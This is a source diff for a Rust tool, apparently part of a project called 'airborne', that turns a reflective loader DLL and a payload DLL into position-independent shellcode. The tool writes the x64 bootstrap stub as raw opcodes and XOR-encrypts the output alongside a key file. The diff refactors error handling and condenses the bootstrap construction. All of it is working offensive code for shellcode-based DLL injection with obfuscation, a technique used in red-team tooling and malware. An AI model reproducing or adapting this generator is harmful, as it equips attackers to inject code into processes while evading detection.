@@ -1,4 +1,7 @@
-use std::{collections::BTreeMap, ffi::CStr, fs, path::PathBuf, slice::from_raw_parts};
+use std::{
+    collections::BTreeMap, error::Error, ffi::CStr, fs, path::PathBuf, process::exit,
+    slice::from_raw_parts,
+};
 
 use airborne_utils::calc_hash;
 use clap::Parser;
@@ -43,6 +46,7 @@ fn main() {
     // preserve the path from being dropped
     let output_path = args.output_path.clone();
 
+    // prepare paths for pretty printing
     let loader_path_str = args.loader_path.to_str().unwrap();
     let payload_path_str = args.payload_path.to_str().unwrap();
     let output_path_str = args.output_path.to_str().unwrap();
@@ -51,29 +55,66 @@ fn main() {
     println!("[+] payload: {}", payload_path_str);
     println!("[+] output: {}", output_path_str);
 
-    let mut loader_b = fs::read(args.loader_path).expect("failed to read sRDI DLL");
-    let mut payload_b = fs::read(args.payload_path).expect("failed to read payload DLL");
+    let mut loader_b = match fs::read(args.loader_path) {
+        Ok(b) => b,
+        Err(e) => {
+            eprintln!("[-] failed to read loader DLL: {}", e);
+            exit(1);
+        }
+    };
+
+    let mut payload_b = match fs::read(args.payload_path) {
+        Ok(b) => b,
+        Err(e) => {
+            eprintln!("[-] failed to read payload DLL: {}", e);
+            exit(1);
+        }
+    };
     let function_hash = calc_hash(args.function_name.as_bytes());
 
-    let mut shellcode = gen_sc(
+    let mut shellcode = match gen_sc(
         &mut loader_b,
         &mut payload_b,
         function_hash,
         args.parameter,
         args.flag,
-    );
+    ) {
+        Ok(sc) => sc,
+        Err(e) => {
+            eprintln!("[-] failed to generate shellcode: {}", e);
+            exit(1);
+        }
+    };
 
     println!("\n[+] xor'ing shellcode");
     let key = gen_xor_key(shellcode.len());
     airborne_utils::xor_cipher(&mut shellcode, &key);
     let mut key_output_path = output_path.clone().into_os_string();
     key_output_path.push(".key");
+
+    // prepare path for pretty printing
     let key_output_path_str = key_output_path.to_str().unwrap();
 
-    println!("\n[+] writing shellcode to '{}'", output_path_str);
-    fs::write(output_path, shellcode).expect("failed to write shellcode to output file");
-    println!("[+] writing xor key to '{}'", key_output_path_str);
-    fs::write(key_output_path, key).expect("failed to write xor key to output file");
+    println!(
+        "\n[+] writing shellcode to '{}' and xor key to '{}'",
+        output_path_str, key_output_path_str
+    );
+
+    match fs::write(output_path, shellcode) {
+        Ok(_) => (),
+        Err(e) => {
+            eprintln!("[-] failed to write shellcode to output file: {}", e);
+            exit(1);
+        }
+    };
+
+    match fs::write(key_output_path, key) {
+        Ok(_) => (),
+        Err(e) => {
+            eprintln!("[-] failed to write xor key to output file: {}", e);
+            exit(1);
+        }
+    };
 }
 
 fn gen_sc(
@@ -82,159 +123,117 @@ fn gen_sc(
     function_hash: u32,
     parameter: String,
     flag: u32,
-) -> Vec<u8> {
-    let loader_addr = export_ptr_by_name(loader_b.as_mut_ptr(), LOADER_ENTRY_NAME)
-        .expect("failed to get loader entry point");
+) -> Result<Vec<u8>, Box<dyn Error>> {
+    let loader_addr = export_ptr_by_name(loader_b.as_mut_ptr(), LOADER_ENTRY_NAME)?;
     let loader_offset = loader_addr as usize - loader_b.as_mut_ptr() as usize;
     println!("[+] loader offset: {:#x}", loader_offset);
 
     // 64-bit bootstrap source: https:// github.com/memN0ps/srdi-rs/blob/main/generate_shellcode
 
-    // TODO: clean up & fix 'call to push immediately after creation' compiler warning by
-    //       calculating little-endian representations of variables (flag, parameter length & offset,
-    //       function hash, payload offset, loader address) beforehand
-
-    let mut bootstrap: Vec<u8> = Vec::new();
-
-    /*
-        1.) save the current location in memory for calculating offsets later
-    */
-
-    // call 0x00 (this will push the address of the next function to the stack)
-    bootstrap.push(0xe8);
-    bootstrap.push(0x00);
-    bootstrap.push(0x00);
-    bootstrap.push(0x00);
-    bootstrap.push(0x00);
-
-    // pop rcx - this will pop the value we saved on the stack into rcx to capture our current location in memory
-    bootstrap.push(0x59);
-
-    // mov r8, rcx - copy the value of rcx into r8 before we start modifying RCX
-    bootstrap.push(0x49);
-    bootstrap.push(0x89);
-    bootstrap.push(0xc8);
-
-    /*
-        2.) align the stack and create shadow space
-    */
-
-    // push rsi - save original value
-    bootstrap.push(0x56);
-
-    // mov rsi, rsp - store our current stack pointer for later
-    bootstrap.push(0x48);
-    bootstrap.push(0x89);
-    bootstrap.push(0xe6);
-
-    // and rsp, 0x0FFFFFFFFFFFFFFF0 - align the stack to 16 bytes
-    bootstrap.push(0x48);
-    bootstrap.push(0x83);
-    bootstrap.push(0xe4);
-    bootstrap.push(0xf0);
-
-    // sub rsp, 0x30 (48 bytes) - create shadow space on the stack, which is required for x64. A minimum of 32 bytes for rcx, rdx, r8, r9. Then other params on stack
-    bootstrap.push(0x48);
-    bootstrap.push(0x83);
-    bootstrap.push(0xec);
-    bootstrap.push(6 * 8); // 6 args that are 8 bytes each
-
-    /*
-        3.) setup reflective loader parameters: place the last 5th and 6th arguments on the stack (rcx, rdx, r8, and r9 are already on the stack as the first 4 arguments)
-    */
-
-    // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) - (32 bytes) Push in arg 5
-    bootstrap.push(0x48);
-    bootstrap.push(0x89);
-    bootstrap.push(0x4C);
-    bootstrap.push(0x24);
-    bootstrap.push(4 * 8); // 5th arg
-
-    // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) - modify the 5th arg to get the real shellcode base
-    bootstrap.push(0x48);
-    bootstrap.push(0x83);
-    bootstrap.push(0x6C);
-    bootstrap.push(0x24);
-    bootstrap.push(4 * 8); // 5th arg
-    bootstrap.push(5); // minus 5 bytes because call 0x00 is 5 bytes to get the allocate memory from VirtualAllocEx from injector
-
-    // mov dword ptr [rsp + 0x28], <flag> - (40 bytes) Push arg 6 just above shadow space
-    bootstrap.push(0xC7);
-    bootstrap.push(0x44);
-    bootstrap.push(0x24);
-    bootstrap.push(5 * 8); // 6th arg
-    bootstrap.append(&mut flag.to_le_bytes().to_vec().clone());
-
-    /*
-        4.) setup reflective loader parameters: 1st -> rcx, 2nd -> rdx, 3rd -> r8, 4th -> r9
-    */
-
-    // mov r9, <parameter_length> - copy the 4th parameter, which is the length of the user data into r9
-    bootstrap.push(0x41);
-    bootstrap.push(0xb9);
-    let parameter_length = parameter.len() as u32; // This must u32 or it breaks assembly
-    bootstrap.append(&mut parameter_length.to_le_bytes().to_vec().clone());
-
-    // add r8, <parameter_offset> + <payload_length> - copy the 3rd parameter, which is address of the user function into r8 after calculation
-    bootstrap.push(0x49);
-    bootstrap.push(0x81);
-    bootstrap.push(0xc0); // minus 5 because of the call 0x00 instruction
     let parameter_offset =
-        (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_b.len() as u32 + payload_b.len() as u32;
-    bootstrap.append(&mut parameter_offset.to_le_bytes().to_vec().clone());
+        BOOTSTRAP_TOTAL_LENGTH - 5 + loader_b.len() as u32 + payload_b.len() as u32;
+    let payload_offset = BOOTSTRAP_TOTAL_LENGTH - 5 + loader_b.len() as u32;
 
-    // mov edx, <prameter_hash> - copy the 2nd parameter, which is the hash of the user function into edx
-    bootstrap.push(0xba);
-    bootstrap.append(&mut function_hash.to_le_bytes().to_vec().clone());
+    // 1.) save the current location in memory for calculating offsets later
+    let b1: Vec<u8> = vec![
+        0xe8, 0x00, 0x00, 0x00, 0x00, // call 0x00
+        0x59, // pop rcx
+        0x49, 0x89, 0xc8, // mov r8, rcx
+    ];
 
-    // add rcx, <payload_offset> - copy the 1st parameter, which is the address of the user dll into rcx after calculation
-    bootstrap.push(0x48);
-    bootstrap.push(0x81);
-    bootstrap.push(0xc1); // minus 5 because of the call 0x00 instruction
-    let payload_offset = (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_b.len() as u32; // mut be u32 or it breaks assembly
-    bootstrap.append(&mut payload_offset.to_le_bytes().to_vec().clone());
+    // 2.) align the stack and create shadow space
+    let b2: Vec<u8> = vec![
+        0x56, // push rsi
+        0x48,
+        0x89,
+        0xe6, // mov rsi, rsp
+        0x48,
+        0x83,
+        0xe4,
+        0xf0, // and rsp, 0x0FFFFFFFFFFFFFFF0
+        0x48,
+        0x83,
+        0xec,
+        6 * 8, // sub rsp, 0x30
+    ];
 
-    /*
-        5.) call the reflective loader
-    */
+    // 3.) setup reflective loader parameters: place the last 5th and 6th arguments on the stack
+    let b3: Vec<u8> = vec![
+        0x48,
+        0x89,
+        0x4C,
+        0x24,
+        4 * 8, // mov qword ptr [rsp + 0x20], rcx
+        0x48,
+        0x83,
+        0x6C,
+        0x24,
+        4 * 8,
+        5, // sub qword ptr [rsp + 0x20], 0x5
+        0xC7,
+        0x44,
+        0x24,
+        5 * 8, // mov dword ptr [rsp + 0x28], <flag>
+    ]
+    .into_iter()
+    .chain(flag.to_le_bytes().to_vec())
+    .collect();
 
-    // call <loader_offset> - call the reflective loader address after calculation
-    bootstrap.push(0xe8);
-    let loader_address =
-        (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4) + loader_offset as u32; // must be u32 or it breaks assembly
-    bootstrap.append(&mut loader_address.to_le_bytes().to_vec().clone());
+    // 4.) setup reflective loader parameters: 1st -> rcx, 2nd -> rdx, 3rd -> r8, 4th -> r9
+    let b4: Vec<u8> = vec![0x41, 0xb9]
+        .into_iter()
+        .chain((parameter.len() as u32).to_le_bytes().to_vec())
+        .chain(vec![
+            0x49, 0x81, 0xc0, // add r8, <parameter_offset> + <payload_length>
+        ])
+        .chain(parameter_offset.to_le_bytes().to_vec())
+        .chain(vec![
+            0xba, // mov edx, <prameter_hash>
+        ])
+        .chain(function_hash.to_le_bytes().to_vec())
+        .chain(vec![
+            0x48, 0x81, 0xc1, // add rcx, <payload_offset>
+        ])
+        .chain(payload_offset.to_le_bytes().to_vec())
+        .collect();
 
-    // padding
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
+    // 5.) call the reflective loader
+    let bootstrap_len = b1.len() + b2.len() + b3.len() + b4.len() + 1;
+    let loader_addr = (BOOTSTRAP_TOTAL_LENGTH - bootstrap_len as u32 - 4) + loader_offset as u32;
+    let b5: Vec<u8> = vec![
+        0xe8, // call <loader_offset>
+    ]
+    .into_iter()
+    .chain(loader_addr.to_le_bytes().to_vec())
+    .chain(vec![
+        0x90, 0x90, // padding
+    ])
+    .collect();
 
-    /*
-        6.) restore the stack and return to the original location (caller)
-    */
+    // 6.) restore the stack and return to the original location (caller)
+    let b6: Vec<u8> = vec![
+        0x48, 0x89, 0xf4, // mov rsp, rsi
+        0x5e, // pop rsi
+        0xc3, // ret
+        0x90, 0x90, // padding
+    ];
 
-    // mov rsp, rsi - reset original stack pointer
-    bootstrap.push(0x48);
-    bootstrap.push(0x89);
-    bootstrap.push(0xf4);
-
-    // pop rsi - put things back where they were left
-    bootstrap.push(0x5e);
-
-    // ret - return to caller and resume execution flow (avoids crashing process)
-    bootstrap.push(0xc3);
-
-    // padding
-    bootstrap.push(0x90);
-    bootstrap.push(0x90);
+    let mut bootstrap: Vec<u8> = b1
+        .into_iter()
+        .chain(b2)
+        .chain(b3)
+        .chain(b4)
+        .chain(b5)
+        .chain(b6)
+        .collect();
 
     if bootstrap.len() != BOOTSTRAP_TOTAL_LENGTH as usize {
-        panic!("Bootstrap length is not correct, please modify the BOOTSTRAP_TOTAL_LEN constant in the source");
-    } else {
-        println!("[+] bootstrap size: {}", bootstrap.len());
+        return Err("invalid bootstrap length".into());
     }
 
-    println!("[+] reflective loader size: {}", loader_b.len());
-    println!("[+] payload size: {}", payload_b.len());
+    println!("[+] bootstrap size: {} bytes", bootstrap.len());
+    println!("[+] reflective loader size: {} kB", loader_b.len() / 1024);
+    println!("[+] payload size: {} kB", payload_b.len() / 1024);
 
     let mut shellcode = Vec::new();
 
@@ -251,7 +250,7 @@ fn gen_sc(
             - user data
     */
 
-    println!("\n[+] total shellcode size: {}", shellcode.len());
+    println!("\n[+] total shellcode size: {} kB", shellcode.len() / 1024);
     println!("\n[+] loader(payload_dll_ptr: *mut c_void, function_hash: u32, user_data_ptr: *mut c_void, user_data_len: u32, shellcode_bin_ptr: *mut c_void, flag: u32)");
     println!(
         "[+] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]"
@@ -265,7 +264,7 @@ fn gen_sc(
         flag
     );
 
-    shellcode
+    Ok(shellcode)
 }
 
 fn gen_xor_key(keysize: usize) -> Vec<u8> {
@@ -278,61 +277,64 @@ fn gen_xor_key(keysize: usize) -> Vec<u8> {
     key
 }
 
-fn export_ptr_by_name(base_ptr: *mut u8, name: &str) -> Option<*mut u8> {
-    for (e_name, addr) in unsafe { get_exports(base_ptr) } {
+fn export_ptr_by_name(base_ptr: *mut u8, name: &str) -> Result<*mut u8, Box<dyn Error>> {
+    for (e_name, addr) in unsafe { get_exports(base_ptr)? } {
         if e_name == name {
-            return Some(addr as _);
+            return Ok(addr as _);
         }
     }
 
-    None
+    Err(format!("failed to find export by name: {}", name).into())
 }
 
-unsafe fn get_exports(base_ptr: *mut u8) -> BTreeMap<String, usize> {
+unsafe fn get_exports(base_ptr: *mut u8) -> Result<BTreeMap<String, usize>, Box<dyn Error>> {
     let mut exports = BTreeMap::new();
 
     let dos_header_ptr = base_ptr as *mut IMAGE_DOS_HEADER;
 
     if (*dos_header_ptr).e_magic != IMAGE_DOS_SIGNATURE {
-        panic!("Failed to get DOS header");
+        return Err("failed to get DOS header for the export".into());
     }
 
     let nt_header_ptr = rva_mut::<IMAGE_NT_HEADERS64>(base_ptr, (*dos_header_ptr).e_lfanew as _);
+
     let export_dir_ptr = rva_to_offset(
         base_ptr as _,
         &*nt_header_ptr,
         (*nt_header_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
             .VirtualAddress,
-    ) as *mut IMAGE_EXPORT_DIRECTORY;
+    )? as *mut IMAGE_EXPORT_DIRECTORY;
 
     let export_names = from_raw_parts(
         rva_to_offset(
             base_ptr as _,
             &*nt_header_ptr,
             (*export_dir_ptr).AddressOfNames,
-        ) as *const u32,
+        )? as *const u32,
         (*export_dir_ptr).NumberOfNames as _,
     );
+
     let export_functions = from_raw_parts(
         rva_to_offset(
             base_ptr as _,
             &*nt_header_ptr,
             (*export_dir_ptr).AddressOfFunctions,
-        ) as *const u32,
+        )? as *const u32,
         (*export_dir_ptr).NumberOfFunctions as _,
     );
+
     let export_ordinals = from_raw_parts(
         rva_to_offset(
             base_ptr as _,
             &*nt_header_ptr,
             (*export_dir_ptr).AddressOfNameOrdinals,
-        ) as *const u16,
+        )? as *const u16,
         (*export_dir_ptr).NumberOfNames as _,
     );
 
     for i in 0..(*export_dir_ptr).NumberOfNames as usize {
         let export_name =
-            rva_to_offset(base_ptr as _, &*nt_header_ptr, export_names[i]) as *const i8;
+            rva_to_offset(base_ptr as _, &*nt_header_ptr, export_names[i])? as *const i8;
 
         if let Ok(export_name) = CStr::from_ptr(export_name).to_str() {
             let export_ordinal = export_ordinals[i] as usize;
@@ -342,19 +344,23 @@ unsafe fn get_exports(base_ptr: *mut u8) -> BTreeMap<String, usize> {
                     base_ptr as _,
                     &*nt_header_ptr,
                     export_functions[export_ordinal],
-                ),
+                )?,
             );
         }
     }
 
-    exports
+    Ok(exports)
 }
 
 fn rva_mut<T>(base_ptr: *mut u8, rva: usize) -> *mut T {
     (base_ptr as usize + rva) as *mut T
 }
 
-unsafe fn rva_to_offset(base: usize, nt_header_ref: &IMAGE_NT_HEADERS64, mut rva: u32) -> usize {
+unsafe fn rva_to_offset(
+    base: usize,
+    nt_header_ref: &IMAGE_NT_HEADERS64,
+    mut rva: u32,
+) -> Result<usize, Box<dyn Error>> {
     let section_header_ptr = rva_mut::<IMAGE_SECTION_HEADER>(
         &nt_header_ref.OptionalHeader as *const _ as _,
         nt_header_ref.FileHeader.SizeOfOptionalHeader as _,
@@ -371,9 +377,9 @@ unsafe fn rva_to_offset(base: usize, nt_header_ref: &IMAGE_NT_HEADERS64, mut rva
             rva -= (*section_header_ptr.add(i)).VirtualAddress;
             rva += (*section_header_ptr.add(i)).PointerToRawData;
 
-            return base + rva as usize;
+            return Ok(base + rva as usize);
         }
     }
 
-    0
+    Err(format!("failed to find section for RVA {:#x}", rva).into())
 }
